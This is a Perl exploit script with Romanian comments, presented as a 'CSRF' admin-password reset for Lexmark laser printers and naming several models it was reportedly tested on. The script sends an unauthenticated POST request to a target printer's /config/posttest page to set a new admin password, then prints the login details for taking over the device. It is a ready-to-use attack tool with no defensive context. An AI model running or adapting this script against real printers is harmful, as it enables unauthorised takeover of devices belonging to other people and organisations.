#!/usr/bin/perl

# =============================================================
# Lexmark Laser Printer <= E323 "CSRF" Reset Admin Pass
# =============================================================
# *Bug Found: THE_MILLER     msn: the_miller[at]linuxmail[dot]com*
# Acest CRSF a fost testat cu succes pe mai multe imprimante Lexmark:
# Lexmark Laser Printer E240n
# Lexmark Laser Printer T632
# Lexmark Color Laser Printer Optra C710
# Lexmark Laser Printer C750
# Lexmark Laser Printer C760
# Lexmark Forms Printer 2491
#
#
#
# "Sunt un strop de intuneric,in lumea roz a manelistilor"
# =============================================================
if ( !$ARGV[1] )
{
print "\n [!] Info : perl lexmark-e323.pl [Ip] [Parola]";
print "\n [?] Exemplu : perl lexmark-e323.pl xxx.xxx.xxx.xxx BadPass";
exit;
}
use LWP;
my $ua = LWP::UserAgent->new(agent=>'Mozilla/4.0 (compatible; Windows 5.1)');
$link = 'http://'.$ARGV[0].'/config/posttest';
$data="GENPASSWORD=".$ARGV[1]."&GENPASSWORD=".$ARGV[1]."&GENOPPANELLOCK+0=0";

my $ua = LWP::UserAgent->new;
my $req = new HTTP::Request 'POST',$link;
$req->content_type('application/x-www-form-urlencoded');
$req->content($data);
my $res = $ua->request($req);
print "\n [!] Parola resetata cu succes!Va puteti autentifica cu:";
print "\n => User-ul : admin";
print "\n => Parola : ".$ARGV[1] ;
